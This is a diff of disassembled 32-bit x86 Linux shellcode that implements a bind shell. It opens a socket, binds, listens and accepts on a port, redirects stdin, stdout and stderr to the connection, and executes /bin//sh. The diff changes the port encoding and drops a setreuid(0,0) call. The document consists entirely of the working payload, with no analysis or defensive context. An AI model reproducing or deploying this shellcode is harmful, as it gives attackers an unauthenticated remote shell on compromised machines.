@@ -17,51 +17,47 @@ Disassembly of section .text:
   11:	cd 80                	int    $0x80
   13:	89 c6                	mov    %eax,%esi
   15:	52                   	push   %edx
-  16:	68 bb 02 bb bb       	push   $0xbbbb02bb
-  1b:	89 e1                	mov    %esp,%ecx
-  1d:	6a 10                	push   $0x10
-  1f:	51                   	push   %ecx
-  20:	56                   	push   %esi
-  21:	89 e1                	mov    %esp,%ecx
-  23:	fe c3                	inc    %bl
-  25:	b0 66                	mov    $0x66,%al
-  27:	cd 80                	int    $0x80
-  29:	52                   	push   %edx
-  2a:	56                   	push   %esi
-  2b:	89 e1                	mov    %esp,%ecx
-  2d:	b3 04                	mov    $0x4,%bl
-  2f:	b0 66                	mov    $0x66,%al
-  31:	cd 80                	int    $0x80
-  33:	52                   	push   %edx
-  34:	52                   	push   %edx
-  35:	56                   	push   %esi
-  36:	89 e1                	mov    %esp,%ecx
-  38:	fe c3                	inc    %bl
-  3a:	b0 66                	mov    $0x66,%al
-  3c:	cd 80                	int    $0x80
-  3e:	89 c3                	mov    %eax,%ebx
-  40:	31 c9                	xor    %ecx,%ecx
-  42:	b0 3f                	mov    $0x3f,%al
-  44:	cd 80                	int    $0x80
-  46:	41                   	inc    %ecx
-  47:	b0 3f                	mov    $0x3f,%al
-  49:	cd 80                	int    $0x80
-  4b:	41                   	inc    %ecx
-  4c:	b0 3f                	mov    $0x3f,%al
-  4e:	cd 80                	int    $0x80
-  50:	31 c0                	xor    %eax,%eax
-  52:	b0 46                	mov    $0x46,%al
-  54:	31 db                	xor    %ebx,%ebx
-  56:	31 c9                	xor    %ecx,%ecx
-  58:	cd 80                	int    $0x80
-  5a:	31 c0                	xor    %eax,%eax
-  5c:	50                   	push   %eax
-  5d:	68 2f 2f 73 68       	push   $0x68732f2f
-  62:	68 2f 62 69 6e       	push   $0x6e69622f
-  67:	89 e3                	mov    %esp,%ebx
-  69:	50                   	push   %eax
-  6a:	53                   	push   %ebx
-  6b:	89 e1                	mov    %esp,%ecx
-  6d:	31 d2                	xor    %edx,%edx
-  6f:	b0 0b                	mov    $0xb,%al
-  71:	cd 80                	int    $0x80
+  16:	66 68 bc bb          	pushw  $0xbbbc
+  1a:	66 6a 02             	pushw  $0x2
+  1d:	89 e1                	mov    %esp,%ecx
+  1f:	6a 10                	push   $0x10
+  21:	51                   	push   %ecx
+  22:	56                   	push   %esi
+  23:	89 e1                	mov    %esp,%ecx
+  25:	fe c3                	inc    %bl
+  27:	b0 66                	mov    $0x66,%al
+  29:	cd 80                	int    $0x80
+  2b:	52                   	push   %edx
+  2c:	56                   	push   %esi
+  2d:	89 e1                	mov    %esp,%ecx
+  2f:	b3 04                	mov    $0x4,%bl
+  31:	b0 66                	mov    $0x66,%al
+  33:	cd 80                	int    $0x80
+  35:	52                   	push   %edx
+  36:	52                   	push   %edx
+  37:	56                   	push   %esi
+  38:	89 e1                	mov    %esp,%ecx
+  3a:	fe c3                	inc    %bl
+  3c:	b0 66                	mov    $0x66,%al
+  3e:	cd 80                	int    $0x80
+  40:	89 c3                	mov    %eax,%ebx
+  42:	31 c9                	xor    %ecx,%ecx
+  44:	b0 3f                	mov    $0x3f,%al
+  46:	cd 80                	int    $0x80
+  48:	41                   	inc    %ecx
+  49:	b0 3f                	mov    $0x3f,%al
+  4b:	cd 80                	int    $0x80
+  4d:	41                   	inc    %ecx
+  4e:	b0 3f                	mov    $0x3f,%al
+  50:	cd 80                	int    $0x80
+  52:	31 c0                	xor    %eax,%eax
+  54:	50                   	push   %eax
+  55:	68 2f 2f 73 68       	push   $0x68732f2f
+  5a:	68 2f 62 69 6e       	push   $0x6e69622f
+  5f:	89 e3                	mov    %esp,%ebx
+  61:	50                   	push   %eax
+  62:	53                   	push   %ebx
+  63:	89 e1                	mov    %esp,%ecx
+  65:	31 d2                	xor    %edx,%edx
+  67:	b0 0b                	mov    $0xb,%al
+  69:	cd 80                	int    $0x80
